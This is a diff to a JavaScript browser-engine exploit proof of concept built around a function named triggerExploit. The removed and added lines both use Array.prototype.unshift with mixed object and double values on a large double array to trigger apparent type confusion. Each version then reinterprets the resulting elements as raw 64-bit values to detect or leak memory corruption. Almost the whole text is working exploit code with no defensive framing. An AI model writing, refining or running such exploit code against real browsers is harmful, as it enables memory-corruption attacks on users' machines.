@@ -37,41 +37,23 @@
 
             function triggerExploit() {
                 try {
-                    // 1. Create optimized double array
-                    updateLog('[1] Creating double array...');
-                    let arr = [1.1];
-                    for(let i = 0; i < 0x10000; i++) {
-                        arr.push(1.1);
-                    }
-                    arr.length = 3;
+                     let arr = [1.1, 2.2, 3.3];
+    for(let i = 0; i < 10000; i++)
+        arr.push(4.4 + i);  // Evita la deduplicazione
 
-                    // 2. Force ArrayWithDouble type
-                    updateLog('[2] Compacting array...');
-                    arr[0] = 1.1;
-                    arr[1] = 2.2;
-                    arr[2] = 3.3;
+    // Unshift misto (oggetto + double)
+    arr.unshift({}, 0.0, {});  // 3 elementi
 
-                    // 3. Trigger vulnerable unshift
-                    updateLog('[3] Executing unshift...');
-                    arr.unshift({}, 0.0);  // startIndex=1, count=2
+    // Legge elementi "shiftati"
+    let leak1 = arr[2];  // Dovrebbe essere 1.1 (original)
+    let leak2 = arr[3];  // Dovrebbe essere 2.2 (original)
 
-                    // 4. Access corrupted elements
-                    updateLog('[4] Reading corrupted values...');
-                    let corrupted = arr[1];
-                    
-                    // 5. Convert to raw bytes
-                    let buf = new ArrayBuffer(8);
-                    new Float64Array(buf)[0] = corrupted;
-                    let bytes = new BigUint64Array(buf)[0];
-                    
-                    updateLog(`[+] Corrupted value: ${hex(bytes)}`);
-                    
-                    // 6. Verify exploit success
-                    if(bytes !== 0x3ff0000000000000n) {
-                        updateLog('[!] EXPLOIT SUCCESS: Memory corruption detected!');
-                    } else {
-                        updateLog('[+] System patched');
-                    }
+    // Conversione a bytes
+    let buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = leak1;
+    console.log("Leak 1:", hex(new BigUint64Array(buf)[0]));
+    new Float64Array(buf)[0] = leak2;
+    console.log("Leak 2:", hex(new BigUint64Array(buf)[0]));
                 } catch(e) {
                     updateLog(`[ERROR] ${e}`);
                 }
